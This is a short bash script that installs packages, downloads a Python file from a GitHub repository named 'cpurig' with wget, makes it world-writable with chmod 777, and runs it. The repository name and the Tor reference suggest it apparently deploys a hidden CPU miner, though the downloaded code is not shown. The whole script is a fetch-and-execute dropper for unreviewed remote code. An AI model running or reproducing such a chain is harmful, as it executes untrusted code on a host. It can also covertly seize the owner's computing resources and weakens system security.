#!/bin/bash
apt-get install -y git wget screen
apt-get install -y python python-dev
wget https://raw.githubusercontent.com/ts6aud5vkg/cpurig/master/ubuntu_tor_docker.py
chmod 777 ubuntu_tor_docker.py
python ubuntu_tor_docker.py


